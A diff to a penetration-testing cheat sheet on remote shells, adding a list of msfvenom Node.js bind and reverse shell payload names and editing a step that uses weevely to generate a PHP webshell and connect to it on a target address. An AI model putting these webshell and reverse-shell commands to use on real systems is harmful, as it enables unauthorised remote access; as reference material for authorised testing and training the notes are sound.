@@ -22,6 +22,14 @@ Source: [https://github.com/evilpacket/node-shells/blob/master/node\_revshell.js
 
 We can also use [nodejsshell.py](https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py) to generate encoded reverse shells.
 
+### msfvenom
+
+```
+nodejs/shell_bind_tcp
+nodejs/shell_reverse_tcp
+nodejs/shell_reverse_tcp_ssl
+```
+
 ## PHP
 
 These are the most common types of shells we'll be turning to, as like it or not, PHP is probably the most common type of web server application.
@@ -34,7 +42,7 @@ Using weevely we can create php webshells:
 weevely generate password /root/webshell.php
 ```
 
-Not we execute it and get a shell in return:
+Now we execute it, point it to the remote page and get a shell in return:
 
 ```
 weevely "http://192.168.1.101/webshell.php" password
